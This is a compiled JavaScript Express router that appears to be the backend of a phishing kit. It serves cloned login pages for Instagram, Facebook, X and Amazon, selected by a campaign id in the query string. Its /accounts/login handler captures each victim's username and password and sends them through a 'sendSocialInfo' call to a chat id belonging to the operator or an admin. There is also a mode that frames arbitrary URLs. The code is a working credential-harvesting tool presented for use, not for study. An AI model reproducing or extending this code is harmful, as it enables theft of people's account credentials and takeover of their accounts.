"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
let router = express_1.default.Router();
const helper = __importStar(require("../helper"));
const path_1 = __importDefault(require("path"));
const Controller = __importStar(require("../controller"));
router.get("/policy", (_, res) => {
    res.status(200).sendFile(path_1.default.join(__dirname, "../views/policy.html"));
});
router.get("/info", (_, res) => {
    res.status(200).sendFile(path_1.default.join(__dirname, "../views/info.html"));
});
router.get("/ping", (_, res) => {
    res.status(200).sendFile(path_1.default.join(__dirname, "../views/ping.html"));
});
router.post("/accounts/login", (req, res) => {
    let { type, redirect, q } = req.query;
    let chatId = Number(process.env.ADMIN_CHAT_ID);
    if (q && q !== "null") {
        let result = helper.findByUid(q);
        if (result === null || result === void 0 ? void 0 : result.chatId)
            chatId = result.chatId;
    }
    let data = {
        platform: type || "",
        username: req.body.username || "",
        password: req.body.password || "",
    };
    Controller.sendSocialInfo(chatId, data).then(() => {
        res.status(200).json({ redirect: redirect || "/" });
    })
        .catch((err) => {
        console.error("Error from sendSocialInfo", err);
        res.status(500).json({ error: "error" });
    });
});
router.get('/facebook.com/pop-up', (req, res) => {
    return res.status(200).sendfile(path_1.default.join(__dirname, "../views/sites/facebook-popUp.html"));
});
router.get('/*', (req, res, next) => {
    const { q } = req.query;
    if (q) {
        let result = helper.findByUid(q);
        if (result) {
            if ((result === null || result === void 0 ? void 0 : result.step) === "clone") {
                switch (result === null || result === void 0 ? void 0 : result.url) {
                    case "instagram.com":
                        return res.status(200).sendfile(path_1.default.join(__dirname, "../views/sites/instagram.html"));
                        break;
                    case "facebook.com":
                        return res.status(200).sendfile(path_1.default.join(__dirname, "../views/sites/facebook.html"));
                        break;
                    case "x.com":
                        return res.status(200).sendfile(path_1.default.join(__dirname, "../views/sites/x.html"));
                        break;
                    case "amazon.com":
                        return res.status(200).sendfile(path_1.default.join(__dirname, "../views/sites/amazon.html"));
                        break;
                    default:
                        res.status(200).render("index");
                }
            }
            else {
                res.status(200).render('iframe', { iframe_url: result === null || result === void 0 ? void 0 : result.url, title: result === null || result === void 0 ? void 0 : result.title });
            }
        }
        else {
            res.status(200).render("index");
        }
    }
    else {
        res.status(200).render("index");
    }
});
exports.default = router;
